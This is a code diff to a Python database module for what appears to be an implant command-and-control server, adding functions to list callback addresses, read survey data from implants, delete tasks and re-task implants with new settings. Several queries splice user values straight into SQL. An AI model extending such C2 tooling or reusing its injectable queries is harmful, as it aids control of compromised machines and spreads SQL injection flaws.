@@ -30,10 +30,18 @@ def getDetails(connection,UUID):
     cur.close()
     return implantDetails
 
+def getC2List(connection):
+    cur = connection.cursor()
+    c2listget = cur.execute("select * from callbackAddresses")
+    c2list = cur.fetchall()    
+    cur.close()
+    return(c2list)
+
+
 def getSurveyList(connection,UUID):
     connection.commit()
     cur = connection.cursor()
-    surveyData = cur.execute("select id,UUID,delivered,details from datastore where (uuid = '" + UUID + "') order by delivered desc limit 30")
+    surveyData = cur.execute("select id,UUID,delivered,details,data from datastore where (uuid = '" + UUID + "') order by delivered desc limit 30")
     surveyData = cur.fetchall()
     cur.close()
     return(surveyData)
@@ -57,9 +65,39 @@ def addTask(connection,UUID,task,notes):
 
 def deleteTask(connection,taskID):
     cur=connection.cursor()
-    cur.execute("delete from tasks where (id="+taskID+") and (is_complete=0)")
+    connection.commit()
+    cur.execute("SELECT is_complete FROM tasks WHERE id = %s", (taskID,))
+    isComplete = cur.fetchall()
+    isComplete=isComplete[0][0]
+    print(isComplete)
+    if isComplete == 0:
+        cur.execute("delete from tasks where (id="+taskID+") and (is_complete=0)")
+        connection.commit()
+        cur.close()
+    else:
+        cur.close()
+        raise ValueError('The task has already completed')
+    return
+
+def updateNotes(connection,UUID,notes):
+    cur=connection.cursor()
+    cur.execute("update implants set notes='%s' where (UUID='%s')" % (notes,UUID))
     connection.commit()
     cur.close()
+    return
+
+def updateSettings(connection,UUID,notes,C2,filter,consumer,interval):
+    cur=connection.cursor()
+    uninstall = generateInstall(connection,UUID,interval)[1]      #Get the current uninstall information
+    cur.execute("UPDATE implants SET notes = %s, c2 = %s, filter = %s, consumer = %s WHERE UUID = %s", (notes, C2, filter, consumer, UUID))
+    connection.commit()
+    cur.close()
+    install = generateInstall(connection,UUID,interval)[0]       #Get the new install information
+    uninstallReinstall =  uninstall + ";" + install
+    addTask(connection,UUID,uninstallReinstall,"SYSTEM TASK: Update Implant Settings")
+    return    
+
+
 
 def generateSurvey(connection,UUID,options,notes):
 #Options Key
@@ -105,6 +143,7 @@ def generateSurvey(connection,UUID,options,notes):
 
 
 def generateInstall(connection,UUID,interval):
+    interval=int(interval)
     cur=connection.cursor()
     connection.commit()
     cur.execute("select * from implants where (UUID='" + UUID + "')")
